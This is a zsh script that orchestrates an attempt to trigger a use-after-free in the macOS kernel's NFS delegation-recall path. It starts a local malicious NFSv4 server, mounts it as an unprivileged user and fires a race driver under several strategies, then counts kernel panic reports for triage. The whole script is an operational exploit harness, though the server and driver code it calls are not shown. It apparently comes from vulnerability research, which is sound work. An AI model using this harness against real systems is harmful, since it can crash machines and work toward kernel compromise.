#!/bin/zsh
# fire.sh — orchestrate the NFS delegation-recall UAF fire on the -zp host (uid501).
# Usage: ./fire.sh <PRESSURE|REVOKE|UMOUNT|RECYCLE> [iterations] [stall_ms]
# Starts the malicious NFSv4 server, mounts it as uid501, runs the race driver.
# On kernel panic the host reboots; on reboot read nfs_uaf/race_cur.txt +
# the newest /Library/Logs/DiagnosticReports/*.panic and triage (WnR/far/pc).
set -u
DIR=/Users/dawgyg/nfs_uaf
STRAT=${1:-PRESSURE}
ITERS=${2:-200}
STALL=${3:-5000}
MNT=$DIR/mnt
CTL=$DIR/ctl
mkdir -p "$MNT"

echo "[*] baseline panic count:"; ls /Library/Logs/DiagnosticReports/*.panic 2>/dev/null | wc -l

echo "[*] (re)starting malicious NFSv4 server on 127.0.0.1:2049 ..."
pkill -f mal_nfs4_server.py 2>/dev/null; sleep 1
: > "$DIR/server.log"
NFS_STALL_MS=$STALL /usr/bin/python3 "$DIR/mal_nfs4_server.py" >> "$DIR/server.log" 2>&1 &
SRV=$!
sleep 2
if ! kill -0 $SRV 2>/dev/null; then echo "[!] server died on start; see server.log"; tail -40 "$DIR/server.log"; exit 1; fi
echo "[*] server pid=$SRV"

echo "idle" > "$CTL"

echo "[*] unmounting any stale mount ..."; umount -f "$MNT" 2>/dev/null
echo "[*] mounting NFSv4 from uid501 (soft, short timeo so a wedged mount recovers) ..."
# soft + intr + short timeout so the race/stall can't permanently hang the driver
mount_nfs -o vers=4,soft,timeo=30,retrans=2,rsize=8192,wsize=8192 127.0.0.1:/ "$MNT" 2>&1
if [ $? -ne 0 ]; then echo "[!] mount failed; see server.log"; tail -60 "$DIR/server.log"; kill $SRV 2>/dev/null; exit 1; fi
echo "[*] mounted. contents:"; ls -la "$MNT" 2>&1 | head

echo "[*] FIRING race_driver strat=$STRAT iters=$ITERS stall=${STALL}ms ..."
"$DIR/race_driver" "$MNT" "$CTL" "$ITERS" "$STRAT" "$STALL"
RC=$?
echo "[*] race_driver returned $RC (no panic this run if you can read this)"

echo "[*] cleanup ..."; echo quit > "$CTL"; sleep 1
umount -f "$MNT" 2>/dev/null
kill $SRV 2>/dev/null
echo "[*] new panic count:"; ls /Library/Logs/DiagnosticReports/*.panic 2>/dev/null | wc -l
